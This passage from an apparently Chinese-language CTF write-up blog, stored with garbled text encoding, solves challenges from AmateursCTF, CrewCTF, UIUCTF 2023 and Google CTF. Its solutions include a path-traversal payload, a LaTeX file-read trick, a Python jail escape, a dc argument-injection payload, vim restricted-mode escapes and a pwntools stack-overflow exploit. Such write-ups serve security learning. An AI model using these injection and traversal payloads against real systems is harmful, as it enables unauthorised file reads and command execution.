/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../..///flag.txt\n~~~\n\n## latek\n\nå…³äºlatekå¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« https://www.freebuf.com/articles/security-management/308191.html\n\n![](/pic/AmateursCTF/web4.png)\n\nç›´æ¥ç”¨\\inputçš„è¯flagè¾“å‡ºä¸å®Œå…¨ï¼Œé—®äº†chatgptå¯ä»¥ç”¨å…¶ä»–æ–¹æ³•è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–\n\n~~~\n\\documentclass{article}\n\\usepackage{verbatim}\n\\begin{document}\nHello, world!\n\\verbatiminput{/flag.txt}\n\\end{document}\n\n~~~\n\n# REV\n\n## volcano\n\nidaåˆ†æï¼Œå…ˆçœ‹mainå‡½æ•°\n\n~~~c\n__int64 __fastcall main(int a1, char **a2, char **a3)\n{\n  __int64 v4; // rbx\n  __int64 v5; // rbx\n  __int64 v6; // rbx\n  unsigned __int64 v7; // [rsp+8h] [rbp-C8h] BYREF\n  unsigned __int64 v8; // [rsp+10h] [rbp-C0h] BYREF\n  unsigned __int64 v9; // [rsp+18h] [rbp-B8h] BYREF\n  unsigned __int64 v10; // [rsp+20h] [rbp-B0h]\n  FILE *stream; // [rsp+28h] [rbp-A8h]\n  char s[136]; // [rsp+30h] [rbp-A0h] BYREF\n  unsigned __int64 v13; // [rsp+B8h] [rbp-18h]\n\n  v13 = __readfsqword(0x28u);\n  setbuf(stdin, 0LL);\n  setbuf(stdout, 0LL);\n  setbuf(stderr, 0LL);\n  printf(\"Give me a bear: \");\n  v7 = 0LL;\n  __isoc99_scanf(\"%llu\", &v7);\n  if ( !sub_12BB(v7) )\n  {\n    puts(\"That doesn't look like a bear!\");\n    return 1LL;\n  }\n  else\n  {\n    printf(\"Give me a volcano: \");\n    v8 = 0LL;\n    __isoc99_scanf(\"%llu\", &v8);\n    if ( (unsigned __int8)sub_13D9(v8) != 1 )\n    {\n      puts(\"That doesn't look like a volcano!\");\n      return 1LL;\n    }\n    else\n    {\n      printf(\"Prove to me they are the same: \");\n      v9 = 0LL;\n      v10 = 4919LL;\n      __isoc99_scanf(\"%llu\", &v9);\n      if ( (v9 & 1) != 0 && v9 != 1 )\n      {\n        v4 = sub_1209(v8);\n        if ( v4 == sub_1209(v7)\n          && (v5 = sub_124D(v8), v5 == sub_124D(v7))\n          && (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) )\n        {\n          puts(\"That looks right to me!\");\n          stream = fopen(\"flag.txt\", \"r\");\n          fgets(s, 128, stream);\n          puts(s);\n          return 0LL;\n        }\n        else\n        {\n          puts(\"Nope that's not right!\");\n          return 1LL;\n        }\n      }\n      else\n      {\n        puts(\"That's not a valid proof!\");\n        return 1LL;\n      }\n    }\n  }\n}\n~~~\n\nå…ˆçœ‹`sub_12BB`å’Œ`sub_13D9`è¿™ä¸¤ä¸ª\n\n~~~c\n_BOOL8 __fastcall sub_12BB(unsigned __int64 a1)\n{\n  if ( (a1 & 1) != 0 )\n    return 0LL;\n  if ( a1 % 3 != 2 )\n    return 0LL;\n  if ( a1 % 5 != 1 )\n    return 0LL;\n  if ( a1 % 7 == 3 )\n    return a1 % 109 == 55;\n  return 0LL;\n}\n~~~\n\n~~~\n_BOOL8 __fastcall sub_13D9(unsigned __int64 a1)\n{\n  unsigned __int64 v2; // [rsp+8h] [rbp-10h]\n\n  v2 = 0LL;\n  while ( a1 )\n  {\n    v2 += a1 & 1;\n    a1 >>= 1;\n  }\n  return v2 > 16 && v2 <= 26;\n}\n~~~\n\né€»è¾‘å¾ˆç®€å•ï¼Œå†™è„šæœ¬çˆ†ç ´ä¸€ä¸‹å°±è¡Œ\n\nçœ‹åé¢\n\n~~~\n if ( v4 == sub_1209(v7)\n          && (v5 = sub_124D(v8), v5 == sub_124D(v7))\n          && (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) )\n~~~\n\nå‰å‡ ä¸ªå®Œå…¨æ²¡ç”¨åªç”¨è€ƒè™‘æœ€åä¸€ä¸ªæ‹¬å·é‡Œçš„å†…å®¹å°±è¡Œã€‚\n\nsub_1430:\n\n~~~c\nunsigned __int64 __fastcall sub_1430(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)\n{\n  unsigned __int64 v5; // [rsp+10h] [rbp-18h]\n  unsigned __int64 v6; // [rsp+20h] [rbp-8h]\n\n  v6 = 1LL;\n  v5 = a1 % a3;\n  while ( a2 )\n  {\n    if ( (a2 & 1) != 0 )\n      v6 = v5 * v6 % a3;\n    a2 >>= 1;\n    v5 = v5 * v5 % a3;\n  }\n  return v6;\n}\n~~~\n\nç›´æ¥å†™è„šæœ¬çˆ†ç ´å°±è¡Œäº†\n\nexp:\n\n~~~python\ndef check1(a1):\n    if a1 & 1 != 0:\n        return 0\n    if a1 % 3 != 2:\n        return 0\n    if a1 % 5 != 1:\n        return 0\n    if a1 % 7 == 3:\n        return a1 % 109 == 55\n    return 0\ndef check2(a1):\n    v2 = 0\n    while a1:\n        v2 += a1 & 1\n        a1 >>= 1\n    return 16 < v2 <= 26\ndef s():\n    for i in range(1,10000000):\n        if check1(i) and check2(i):\n            print(i)\ndef a():\n        for i in range(1,10):\n            if ((i & 1) != 0 and (i!= 1)):\n                print(i)\ns() #è¾“å‡ºå‰ä¸¤ä¸ªæ•°\na() #è¾“å‡ºç¬¬ä¸‰ä¸ªæ•°\n~~~\n\nbearå’Œvolcanoçš„æ•°å€¼ä¸€æ ·ã€‚\n\n# MISC\n\n# Censorship\n\nç»™äº†ä¸€ä¸ªmain.py\n\n~~~python\n#!/usr/local/bin/python\nfrom flag import flag\n\nfor _ in [flag]:\n    while True:\n        try:\n            code = ascii(input(\"Give code: \"))\n            if \"flag\" in code or \"e\" in code or \"t\" in code or \"\\\\\" in code:\n                raise ValueError(\"invalid input\")\n            exec(eval(code))\n        except Exception as err:\n            print(err)\n\n~~~\n\n\n\nå¯ä»¥æ‰§è¡Œpythonçš„å‘½ä»¤,ä½†æ˜¯ä¸èƒ½æœ‰`flag`,`e`,`t`ï¼Œflagæ˜¯è¢«å®šä¹‰çš„ä½†æ˜¯printé‡Œæœ‰tæ²¡æœ‰åŠæ³•å›æ˜¾ï¼Œå¯ä»¥ç”¨pythonçš„å†…ç½®å‡½æ•°è·å¾—printã€‚\n\npayload:\n\n~~~\nvars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())\n~~~\n\n","tags":["ctf"],"categories":["ctf"]},{"title":"CrewCTF","url":"/2023/07/11/CrewCTF/","content":"\n# WEB\n\n## sequence_gallery \t\t\t\t\t\n\nä¸‹è½½é™„ä»¶\n\n~~~python\n#main.py\nimport os\nimport sqlite3\nimport subprocess\n\nfrom flask import Flask, request, render_template\n\napp = Flask(__name__)\n\n@app.get('/')\ndef index():\n\tsequence = request.args.get('sequence', None)\n\tif sequence is None:\n\t\treturn render_template('index.html')\n\n\tscript_file = os.path.basename(sequence + '.dc') #æ„é€ è„šæœ¬å,å°†sequenceå’Œ.dcå­—ç¬¦ä¸²è¿æ¥èµ·æ¥ï¼Œå¹¶è·å–è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚\n\tif ' ' in script_file or 'flag' in script_file:\n\t\treturn ':('\n\n\tproc = subprocess.run(     #è¿è¡Œdcå‘½ä»¤\n\t\t['dc', script_file], \n\t\tcapture_output=True,\n\t\ttext=True,\n\t\ttimeout=1,\n\t)\n\toutput = proc.stdout\n\n\treturn render_template('index.html', output=output)\n\nif __name__ == '__main__':\n\tapp.run(host='0.0.0.0', port=8080)\n\n~~~\n\n~~~\nsubprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None)\n\nargsï¼šè¡¨ç¤ºè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚å¿…é¡»æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²å‚æ•°åˆ—è¡¨ã€‚\nstdinã€stdout å’Œ stderrï¼šå­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯ã€‚å…¶å€¼å¯ä»¥æ˜¯ subprocess.PIPEã€subprocess.DEVNULLã€ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶æè¿°ç¬¦ã€å·²ç»æ‰“å¼€çš„æ–‡ä»¶å¯¹è±¡æˆ–è€… Noneã€‚subprocess.PIPE è¡¨ç¤ºä¸ºå­è¿›ç¨‹åˆ›å»ºæ–°çš„ç®¡é“ã€‚subprocess.DEVNULL è¡¨ç¤ºä½¿ç”¨ os.devnullã€‚é»˜è®¤ä½¿ç”¨çš„æ˜¯ Noneï¼Œè¡¨ç¤ºä»€ä¹ˆéƒ½ä¸åšã€‚å¦å¤–ï¼Œstderr å¯ä»¥åˆå¹¶åˆ° stdout é‡Œä¸€èµ·è¾“å‡ºã€‚\ntimeoutï¼šè®¾ç½®å‘½ä»¤è¶…æ—¶æ—¶é—´ã€‚å¦‚æœå‘½ä»¤æ‰§è¡Œæ—¶é—´è¶…æ—¶ï¼Œå­è¿›ç¨‹å°†è¢«æ€æ­»ï¼Œå¹¶å¼¹å‡º TimeoutExpired å¼‚å¸¸ã€‚\ncheckï¼šå¦‚æœè¯¥å‚æ•°è®¾ç½®ä¸º Trueï¼Œå¹¶ä¸”è¿›ç¨‹é€€å‡ºçŠ¶æ€ç ä¸æ˜¯ 0ï¼Œåˆ™å¼¹ å‡º CalledProcessError å¼‚å¸¸ã€‚\nencoding: å¦‚æœæŒ‡å®šäº†è¯¥å‚æ•°ï¼Œåˆ™ stdinã€stdout å’Œ stderr å¯ä»¥æ¥æ”¶å­—ç¬¦ä¸²æ•°æ®ï¼Œå¹¶ä»¥è¯¥ç¼–ç æ–¹å¼ç¼–ç ã€‚å¦åˆ™åªæ¥æ”¶ bytes ç±»å‹çš„æ•°æ®ã€‚\nshellï¼šå¦‚æœè¯¥å‚æ•°ä¸º Trueï¼Œå°†é€šè¿‡æ“ä½œç³»ç»Ÿçš„ shell æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚\n~~~\n\nåœ¨`subprocess.run()`ä¸­`shell`æ²¡ç­‰äº`TRUE`ä½†æ˜¯å®¹æ˜“å—åˆ°å‚æ•°çš„å½±å“\n\n![](/pic/CrewCTF/web1.png)\n\nåœ¨kalié‡Œç”¨manå‘½ä»¤çœ‹dcçš„æ–‡æ¡£\n\n![](/pic/CrewCTF/web1.1.png)\n\nç”¨`-e`å’Œ`!`å¯ä»¥æ‰§è¡Œå‘½ä»¤,ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œç”¨å…¶ä»–ç¬¦å·ç»•è¿‡ï¼Œåœ¨æœ€åéœ€è¦åŠ ä¸Š`%0a`è¡¨ç¤ºè¾“å…¥äº†ENTER\n\npayload:`?sequence=-e${IFS}!cat${IFS}*.txt%0A`\n\nå¾—åˆ°flag:`crew{10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx} `\n\næ”¾åˆ°kalié‡Œç”¨dcå‘½ä»¤è½¬æ¢ä¸ºçœŸå®çš„flag\n\n![](/pic/CrewCTF/web1.2.png)\n","tags":["ctf"],"categories":["ctf","å¤ç›˜"]},{"title":"UIUCTF2023","url":"/2023/07/04/UIUCTF023/","content":"\n# MISC\n\n## vimjail1            \n\nè¿™é“é¢˜ä¸€è¿æ¥å°±æ˜¯æ’å…¥æ¨¡å¼ï¼Œæƒ³åŠæ³•é€€å‡ºæ’å…¥æ¨¡å¼.\n\n~~~\n#entry.sh\n#!/usr/bin/env sh\n\nchmod -r /flag.txt\n\nvim -R -M -Z -u /home/user/vimrc\n\n~~~\n\nä»¥åªè¯»ã€æ–‡æœ¬ä¸å¯ä¿®æ”¹ã€é™åˆ¶æ¨¡å¼ã€å¯åŠ¨å¹¶ä¸”ç”¨`/home/user/vimrc`æ›¿ä»£äº†åŸæœ‰çš„.vimrc\n\n~~~\n#vimrc\nset nocompatible\nset insertmode\n# ç¦ç”¨äº†å…¼å®¹æ¨¡å¼ï¼Œå¹¶ä¸”é»˜è®¤å¯åŠ¨æ’å…¥æ¨¡å¼\ninoremap <c-o> nope\ninoremap <c-l> nope\ninoremap <c-z> nope\ninoremap <c-\\><c-n> nope\n# å°†è¿™äº›ç»„åˆé”®è½¬æ¢ä¸ºæ’å…¥å•è¯nope\n~~~\n\nä½†æ˜¯å¯ä»¥æŒ‰ä¸¤æ¬¡`ctrl+\\`å†æŒ‰ä¸€æ¬¡`ctrl+n`æ¥ç»•è¿‡ï¼Œç„¶åç”¨`:e`æ¥è¯»å–flagã€‚\n\n`:e`è¡¨ç¤ºç¼–è¾‘ä¸€ä¸ªæ–‡ä»¶\n\n![](/pic/uiu/vim1.png)\n\n##  vimjail2    \n\n~~~sh\n#entry.sh\n#!/usr/bin/env sh\n\nvim -R -M -Z -u /home/user/vimrc -i /home/user/viminfo\n\ncat /flag.txt\n~~~\n\nä»¥åªè¯»æ¨¡å¼ã€æ–‡æœ¬ä¸å¯ä¿®æ”¹ã€é™åˆ¶æ¨¡å¼å¯åŠ¨vimï¼Œæ›¿æ¢äº†åŸæœ‰çš„vimrcå’Œviminfo\n\n ~~~\n #vimrc\n set nocompatible\n set insertmode\n \n inoremap <c-o> nope\n inoremap <c-l> nope\n inoremap <c-z> nope\n inoremap <c-\\><c-n> nope\n \n cnoremap a _\n cnoremap b _\n cnoremap c _\n cnoremap d _\n cnoremap e _\n cnoremap f _\n cnoremap g _\n cnoremap h _\n cnoremap i _\n cnoremap j _\n cnoremap k _\n cnoremap l _\n cnoremap m _\n cnoremap n _\n cnoremap o _\n cnoremap p _\n cnoremap r _\n cnoremap s _\n cnoremap t _\n cnoremap u _\n cnoremap v _\n cnoremap w _\n cnoremap x _\n cnoremap y _\n cnoremap z _\n cnoremap ! _\n cnoremap @ _\n cnoremap # _\n cnoremap $ _\n cnoremap % _\n cnoremap ^ _\n cnoremap & _\n cnoremap * _\n cnoremap - _\n cnoremap + _\n cnoremap = _\n cnoremap ` _\n cnoremap ~ _\n cnoremap { _\n cnoremap } _\n cnoremap [ _\n cnoremap ] _\n cnoremap \\| _\n cnoremap \\ _\n cnoremap ; _\n cnoremap < _\n cnoremap > _\n cnoremap , _\n cnoremap . _\n cnoremap / _\n cnoremap ? _\n ~~~\n\nå°†æ‰€æœ‰å­—ç¬¦éƒ½è½¬æ¢æˆäº†ä¸‹åˆ’çº¿ï¼Œç»•è¿‡æ–¹å¼è¿˜æ˜¯ä¸¤æ¬¡`ctrl+\\`+`ctrl+n`ï¼Œentry.shä¸­æœ€åæœ‰ä¸€ä¸ª`cat /flag`,è¿™æ„å‘³ç€é€€å‡ºvimåä¼šæ‰“å°å‡ºflag.\n\n`:q`å³å¯ã€‚\n\n## Corny Kernel            \n\né™„ä»¶ç»™äº†ä¸€ä¸ªcæ–‡ä»¶\n\n~~~c\n// SPDX-License-Identifier: GPL-2.0-only\n\n#define pr_fmt(fmt) KBUILD_MODNAME \": \" fmt\n\n#include <linux/module.h>\n#include <linux/init.h>\n#include <linux/kernel.h>\n\nextern const char *flag1, *flag2;\n\nstatic int __init pwny_init(void)\n{\n\tpr_alert(\"%s\\n\", flag1);\n\treturn 0;\n}\n\nstatic void __exit pwny_exit(void)\n{\n\tpr_info(\"%s\\n\", flag2);\n}\n\nmodule_init(pwny_init);\nmodule_exit(pwny_exit);\n\nMODULE_AUTHOR(\"Nitya\");\nMODULE_DESCRIPTION(\"UIUCTF23\");\nMODULE_LICENSE(\"GPL\");\nMODULE_VERSION(\"0.1\");\n~~~\n\nä¸‹é¢çš„ä»£ç çš„æ„æ€æ˜¯å½“åŠ è½½æ¨¡å—çš„æ—¶å€™è¾“å‡ºç¬¬ä¸€æ®µflag\n\n~~~c\nstatic int __init pwny_init(void)\n{\n\tpr_alert(\"%s\\n\", flag1);\n\treturn 0;\n}\n\n...\n\nmodule_init(pwny_init); #è¿™è¡Œä»£ç å°† pwny_init å‡½æ•°æ³¨å†Œä¸ºæ¨¡å—çš„åˆå§‹åŒ–å‡½æ•°ã€‚åœ¨æ¨¡å—åŠ è½½æ—¶ï¼Œè¯¥å‡½æ•°å°†è¢«è°ƒç”¨ã€‚\n~~~\n\né¦–å…ˆç”¨`gzip -d pwnymodule.ko.gz`ï¼Œç„¶åç”¨`insmod pwnymodule.ko`åŠ è½½è¿™ä¸ªæ¨¡å—ï¼ŒåŠ è½½å®Œæˆåä¼šè¾“å‡ºç¬¬ä¸€ä¸²flagã€‚\n\n~~~c\nstatic void __exit pwny_exit(void)\n{\n\tpr_info(\"%s\\n\", flag2);\n}\nmodule_exit(pwny_exit);   #è¿™è¡Œä»£ç å°† pwny_exit å‡½æ•°æ³¨å†Œä¸ºæ¨¡å—çš„é€€å‡ºå‡½æ•°ã€‚åœ¨æ¨¡å—è¢«å¸è½½æ—¶ï¼Œè¯¥å‡½æ•°å°†è¢«è°ƒç”¨æ¥æ‰§è¡Œæ¸…ç†æ“ä½œã€‚\n\n~~~\n\nè¿™ä¸€ä¸²ä»£ç çš„æ„æ€æ˜¯è¿™ä¸ªæ¨¡å—åœ¨è¢«å¸è½½çš„æ—¶å€™è¾“å‡ºç¬¬äºŒæ®µflag,ç”¨`rmmod pwnymodule.ko`è¿™ä¸ªå¸è½½æ¨¡å—,ç„¶åç”¨`dmesg`è¾“å‡ºå†…æ ¸çš„ä¿¡æ¯ï¼Œåœ¨æœ€åä¼šè¾“å‡ºä¸¤æ®µflagã€‚\n\n## vimjail1.5\n\n~~~sh\n#entry.sh\n#!/usr/bin/env sh\n\nvim -R -M -Z -u /home/user/vimrc\n\n~~~\n\n~~~\n#vimrc\nset nocompatible\nset insertmode\n\ninoremap <c-o> nope\ninoremap <c-l> nope\ninoremap <c-z> nope\ninoremap <c-\\> nope\n~~~\n\nåˆ«çš„æ²¡å˜ï¼Œä½†æ˜¯ä¹‹å‰çš„æ–¹æ³•æ²¡ç”¨äº†ï¼Œç”¨`ctrl+r`è¿™ä¸ªç”¨äºæ‰§è¡Œæ’¤é”€å’Œé‡åšæ“ä½œã€‚ç„¶åç”¨`=execute(readfile('flag.txt'))`\n\n`=` æ˜¯ç”¨äºæ‰§è¡Œè¡¨è¾¾å¼çš„å‘½ä»¤ã€‚`execute()`ï¼š`execute()` å‡½æ•°ç”¨äºæ‰§è¡Œ Vim å‘½ä»¤ã€‚`readfile('flag.txt')`ï¼šä½¿ç”¨ Vim çš„å†…ç½®å‡½æ•° `readfile()` è¯»å–åä¸º `flag.txt` çš„æ–‡ä»¶å†…å®¹ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«æ–‡ä»¶å†…å®¹çš„åˆ—è¡¨ã€‚å°±æ˜¯å°†flag.txté‡Œé¢çš„å†…å®¹å˜æˆå‘½ä»¤æ‰§è¡Œ,ç„¶åå°±ä¼šæŠ¥é”™\n\n![](/pic/uiu/vim1.5.png)\n\næˆ–è€…ï¼Œç”¨`=execute(':e flag.txt')`ç„¶åæŒ‰ä¸¤æ¬¡å›è½¦ã€‚\n\n## vimjail2.5\n\n~~~\n#vimrc\nset nocompatible\nset insertmode\n\ninoremap <c-o> nope\ninoremap <c-l> nope\ninoremap <c-z> nope\ninoremap <c-\\> nope\n\ncnoremap a _\ncnoremap b _\ncnoremap c _\ncnoremap d _\ncnoremap e _\ncnoremap f _\ncnoremap g _\ncnoremap h _\ncnoremap i _\ncnoremap j _\ncnoremap k _\ncnoremap l _\ncnoremap m _\ncnoremap n _\ncnoremap o _\ncnoremap p _\ncnoremap r _\ncnoremap s _\ncnoremap t _\ncnoremap u _\ncnoremap v _\ncnoremap w _\ncnoremap x _\ncnoremap y _\ncnoremap z _\ncnoremap ! _\ncnoremap @ _\ncnoremap # _\ncnoremap $ _\ncnoremap % _\ncnoremap ^ _\ncnoremap & _\ncnoremap * _\ncnoremap - _\ncnoremap + _\ncnoremap = _\ncnoremap ` _\ncnoremap ~ _\ncnoremap { _\ncnoremap } _\ncnoremap [ _\ncnoremap ] _\ncnoremap \\| _\ncnoremap \\ _\ncnoremap ; _\ncnoremap < _\ncnoremap > _\ncnoremap , _\ncnoremap . _\ncnoremap / _\ncnoremap ? _\n\n~~~\n\nè¿™ä¸ªåªèƒ½è¾“å…¥`:q`ï¼Œæ–¹æ³•åŸºæœ¬ä¸Šå·®ä¸å¤šï¼Œè¿˜æ˜¯`ctrl+r`ç„¶å`=`,æŒ‰`TAB`é”®å¯ä»¥è¡¥å…¨å†…ç½®ä»£ç ï¼Œç„¶åæ‰¾åˆ°`execute`ï¼Œæœ€åçš„å‘½ä»¤æ˜¯`execute(\":q\")`ï¼Œåä¼šè¾“å‡ºflagã€‚\n\n# crypto\n\n## Three-Time Pad                      \n\nhttp://dann.com.br/alexctf2k17-crypto100-many_time_secrets/\n\nçœ‹è¿™ç¯‡åšå®¢ï¼Œç”¨ä»–çš„è„šæœ¬å¯ä»¥è§£å‡ºè¿™é“é¢˜\n\n~~~python\n#!/usr/bin/python\n## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017\n# @author intrd - http://dann.com.br/ \n# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)\n\nimport string\nimport collections\nimport sets, sys\n\n# 11 unknown ciphertexts (in hex format), all encrpyted with the same key\nc1 = \"14f5f95b4a252948a8aef177d6c92d82e3016362bd7463f41f40a00ad9e0ccad911b959ef8dfad5f1cc4481ecb64\"\nc2 = \"06e2f65a4c256d0ba8ada164cecd329cae436069f83476e91757e91bd4a4cce2c60a8f9aac8cb14210d55253cd787c0f6a\"\nc3 = \"03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386\"\nciphers = [c1, c2, c3]\n# The target ciphertext we want to crack\ntarget_cipher = \"03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386\"\n\n# XORs two string\ndef strxor(a, b):     # xor two strings (trims the longer input)\n    return \"\".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])\n\n# To store the final key\nfinal_key = [None]*150\n# To store the positions we know are broken\nknown_key_positions = set()\n\n# For each ciphertext\nfor current_index, ciphertext in enumerate(ciphers):\n\tcounter = collections.Counter()\n\t# for each other ciphertext\n\tfor index, ciphertext2 in enumerate(ciphers):\n\t\tif current_index != index: # don't xor a ciphertext with itself\n\t\t\tfor indexOfChar, char in enumerate(strxor(ciphertext.decode('hex'), ciphertext2.decode('hex'))): # Xor the two ciphertexts\n\t\t\t\t# If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)\n\t\t\t\tif char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index\n\tknownSpaceIndexes = []\n\n\t# Loop through all positions where a space character was possible in the current_index cipher\n\tfor ind, val in counter.items():\n\t\t# If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!\n\t\tif val >= 7: knownSpaceIndexes.append(ind)\n\t#print knownSpaceIndexes # Shows all the positions where we now know the key!\n\n\t# Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!\n\txor_with_spaces = strxor(ciphertext.decode('hex'),' '*150)\n\tfor index in knownSpaceIndexes:\n\t\t# Store the key's value at the correct position\n\t\tfinal_key[index] = xor_with_spaces[index].encode('hex')\n\t\t# Record that we known the key at this position\n\t\tknown_key_positions.add(index)\n\n# Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)\nfinal_key_hex = ''.join([val if val is not None else '00' for val in final_key])\n# Xor the currently known key with the target cipher\noutput = strxor(target_cipher.decode('hex'),final_key_hex.decode('hex'))\n\nprint \"Fix this sentence:\"\nprint ''.join([char if index in known_key_positions else '*' for index, char in enumerate(output)])+\"\\n\"\n\n# WAIT.. MANUAL STEP HERE \n# This output are printing a * if that character is not known yet\n# fix the missing characters like this: \"Let*M**k*ow if *o{*a\" = \"cure, Let Me know if you a\"\n# if is too hard, change the target_cipher to another one and try again\n# and we have our key to fix the entire text!\n\n#sys.exit(0) #comment and continue if u got a good key\n\ntarget_plaintext = \"printed on flammable material so that spies could\"\nprint \"Fixed:\"\nprint target_plaintext+\"\\n\"\n\nkey = strxor(target_cipher.decode('hex'),target_plaintext)\n\nprint \"Decrypted msg:\"\nfor cipher in ciphers:\n\tprint strxor(cipher.decode('hex'),key)\n\nprint \"\\nPrivate key recovered: \"+key+\"\\n\"\n~~~\n\nè¿è¡Œå¾—åˆ°flag\n\n## At Home\n\n~~~python\n#chal.py\nfrom Crypto.Util.number import getRandomNBitInteger\n\nflag = int.from_bytes(b\"uiuctf{******************}\", \"big\")\n\na = getRandomNBitInteger(256)\nb = getRandomNBitInteger(256)\na_ = getRandomNBitInteger(256)\nb_ = getRandomNBitInteger(256)\n\nM = a * b - 1\ne = a_ * M + a\nd = b_ * M + b\n\nn = (e * d - 1) // M\n\nc = (flag * e) % n\n\nprint(f\"{e = }\")\nprint(f\"{n = }\")\nprint(f\"{c = }\")\n\n~~~\n\n~~~\ne = 359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713\nn = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689\nc = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869\n~~~\n\né€šè¿‡c=(flag*e)%nå¯å¾—\n\n```\nc = (flag * e) % n\nc * e^-1 = (flag * e * e^-1) % n\nc * e^-1 = flag % n\n```\n\n~~~python\nfrom Crypto.Util.number import *\ne = 359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713\nn = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689\nc = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869\nd=inverse(e,n)\nflag=(c*d)%n\nprint(long_to_bytes(flag))\n~~~\n\n# PWN\n\n## Chainmail            \n\nä¸€ä¸ªåŸºç¡€çš„æ ˆæº¢å‡ºï¼Œè·³åˆ°give_flagçš„å‡½æ•°å³å¯ï¼Œä½†è¦æ³¨æ„çš„æ˜¯åœ¨å‘é€give_flagçš„åœ°å€ä¹‹å‰è¦å†ç»™ä»–å‘é€ä¸€ä¸ª`ret`çš„åœ°å€ï¼Œå¦åˆ™ä¼šé€ æˆé”™è¯¯çš„å¯¹é½ã€‚`ret`çš„åœ°å€å¯ä»¥ç”¨`ROPgadget `æ‰¾ï¼Œå‘½ä»¤:`ROPgadget --binary chal --only  'ret'`ã€‚\n\nexpï¼š\n\n~~~python\nfrom pwn import *\na = remote(\"chainmail.chal.uiuc.tf\", 1337)\npayload=b'a'*72 +p64(0x40101a) + p64(0x401216)\na.sendline(payload)\na.interactive()\n~~~\n\n# WEB\n\n## peanut-xss\n\nXSSå­¦çš„ä¸æ˜¯å¾ˆå¥½ï¼Œå…·ä½“æ€ä¹ˆè§£å¯ä»¥çœ‹ä¸‹é¢çš„æ–‡ç« :\n\nhttps://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss\n","tags":["ctf"],"categories":["ctf"]},{"title":"Google-CTF2023","url":"/2023/06/29/Google-CTF2023/","content":"\n# MISC\n\n## PAPAPAPA\n\nä¸‹è½½ä¸‹æ¥é™„ä»¶æ˜¯ä¸€å¼ å…¨ç™½çš„å›¾ç‰‡ï¼Œé€šè¿‡ä¿®æ”¹jpgçš„å®½é«˜è·å¾—flag\n\n![](/pic/googlectf/papapa.png)\n\nä»`FF`åˆ°`01`ä¸­é—´ï¼Œä¿®æ”¹æˆ`FF C0 00 11 08 02 00 02 10 03 01 31 00 02 31 01 03 31 01`\n\nå³è¾¹å°±æ˜¯flag\n\n# WEB\n\n## 